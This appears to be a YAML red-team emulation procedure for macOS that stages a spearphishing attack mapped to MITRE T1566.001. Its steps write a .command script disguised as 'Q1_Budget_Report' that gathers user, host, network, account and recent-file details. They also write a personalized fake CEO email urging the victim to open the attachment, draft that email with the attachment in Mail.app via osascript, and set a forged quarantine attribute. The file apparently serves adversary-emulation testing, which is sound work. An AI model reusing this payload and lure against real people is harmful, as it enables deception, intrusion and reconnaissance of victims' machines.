---
api_version: 2.0
uuid: 3c7d5b0e-6f2a-4e9b-8a1d-2c5e7f1a3d8b
name: Spear Phishing Delivery
authors:
  - mbhatt
description: |
  Creates a targeted spearphishing payload and delivers it via Mail.app. Builds
  a .command payload with embedded reconnaissance commands, crafts a personalized
  HTML email body, composes the email with attachment in Mail.app using osascript,
  and sets quarantine attributes on the payload file.

mitre:
  tactics:
    - "TA0001 Initial Access"
  techniques:
    - "T1566 Phishing"
  subtechniques:
    - "T1566.001 Phishing: Spearphishing Attachment"

requirements:
  platforms:
    - os: darwin

args:
  - name: victim_name
    description: "Name of targeted individual"
    type: string
    default: "Sarah Johnson"
  - name: victim_company
    description: "Company where victim works"
    type: string
    default: "TechCorp Industries"
  - name: payload_name
    description: "Filename for the payload disguised as a document"
    type: string
    default: "Q1_Budget_Report.command"

steps:
  - name: create_targeted_payload
    description: Create a .command payload with embedded reconnaissance commands
    inline: |
      mkdir -p /tmp/ttp_spearphish
      cat > /tmp/ttp_spearphish/{{ .Args.payload_name }} << 'PAYLOAD'
      #!/bin/bash
      # Targeted payload - disguised as a budget report
      # Performs host reconnaissance upon execution
      EXFIL_DIR="/tmp/.budget_data_$(date +%s)"
      mkdir -p "${EXFIL_DIR}"
      echo "=== System Info ===" > "${EXFIL_DIR}/recon.txt"
      whoami >> "${EXFIL_DIR}/recon.txt"
      hostname >> "${EXFIL_DIR}/recon.txt"
      sw_vers >> "${EXFIL_DIR}/recon.txt"
      echo "=== Network ===" >> "${EXFIL_DIR}/recon.txt"
      ifconfig | grep "inet " >> "${EXFIL_DIR}/recon.txt"
      echo "=== Users ===" >> "${EXFIL_DIR}/recon.txt"
      dscl . list /Users | grep -v '^_' >> "${EXFIL_DIR}/recon.txt"
      echo "=== Recent Files ===" >> "${EXFIL_DIR}/recon.txt"
      ls -lt ~/Documents/ 2>/dev/null | head -10 >> "${EXFIL_DIR}/recon.txt"
      echo "Report generated" && open -a TextEdit "${EXFIL_DIR}/recon.txt"
      PAYLOAD
      chmod +x /tmp/ttp_spearphish/{{ .Args.payload_name }}
      echo "[+] Created targeted payload: /tmp/ttp_spearphish/{{ .Args.payload_name }}"

  - name: create_phishing_email_body
    description: Create a convincing personalized HTML email body
    inline: |
      cat > /tmp/ttp_spearphish/email_body.html << HTMLEOF
      <html>
      <body style="font-family: -apple-system, sans-serif; color: #333;">
      <p>Hi {{ .Args.victim_name }},</p>
      <p>I hope this email finds you well. As discussed in our last meeting, please find
      attached the Q1 Budget Report for your review. The board is expecting our final
      numbers by end of week, so I would appreciate your prompt attention to this.</p>
      <p>Please open the attached report and review the revised allocation figures.
      Let me know if you have any questions.</p>
      <p>Best regards,<br>
      David Chen<br>
      Chief Executive Officer<br>
      {{ .Args.victim_company }}<br>
      <span style="color: #888; font-size: 12px;">Sent from my iPhone</span></p>
      </body>
      </html>
      HTMLEOF
      echo "[+] Created personalized HTML email body"

  - name: compose_email_with_attachment
    description: Use osascript to compose the spearphishing email in Mail.app
    inline: |
      EMAIL_BODY=$(cat /tmp/ttp_spearphish/email_body.html)
      ATTACHMENT_PATH="/tmp/ttp_spearphish/{{ .Args.payload_name }}"
      osascript << APPLESCRIPT
      tell application "Mail"
        set newMessage to make new outgoing message with properties {subject:"Q1 Budget Report - Please Review", content:"${EMAIL_BODY}", visible:true}
        tell newMessage
          make new to recipient at end of to recipients with properties {name:"{{ .Args.victim_name }}", address:"victim@{{ .Args.victim_company }}.com"}
          make new attachment with properties {file name:POSIX file "${ATTACHMENT_PATH}"} at after the last paragraph
        end tell
      end tell
      APPLESCRIPT
      echo "[+] Composed spearphishing email in Mail.app with payload attachment"

  - name: set_quarantine_on_payload
    description: Set quarantine extended attributes on the payload file
    inline: |
      xattr -w com.apple.quarantine "0081;$(printf '%x' $(date +%s));Mail;$(uuidgen)" /tmp/ttp_spearphish/{{ .Args.payload_name }}
      echo "[+] Quarantine attribute set on payload"
      echo "[+] Extended attributes:"
      xattr -l /tmp/ttp_spearphish/{{ .Args.payload_name }}

  - name: verify_payload_crafted
    description: Verify the payload is properly crafted and the email was composed
    inline: |
      echo "[+] Payload verification:"
      file /tmp/ttp_spearphish/{{ .Args.payload_name }}
      echo ""
      echo "[+] Payload permissions:"
      ls -la /tmp/ttp_spearphish/{{ .Args.payload_name }}
      echo ""
      echo "[+] Quarantine check:"
      xattr -p com.apple.quarantine /tmp/ttp_spearphish/{{ .Args.payload_name }} 2>/dev/null && echo "[+] Quarantine xattr present"
      echo ""
      echo "[+] Mail.app outgoing messages:"
      osascript -e 'tell application "Mail" to get subject of every outgoing message' 2>/dev/null
      echo "[+] PASS: Spearphishing payload and email are ready"
    cleanup:
      inline: |
        osascript << 'APPLESCRIPT'
        tell application "Mail"
          set msgList to every outgoing message
          repeat with msg in msgList
            if subject of msg contains "Q1 Budget Report" then
              delete msg
            end if
          end repeat
        end tell
        APPLESCRIPT
        rm -rf /tmp/ttp_spearphish
        echo "[+] Cleanup: Email draft deleted and payload files removed"

tests:
  - name: spear_phishing_delivery_test
    dry_run: true
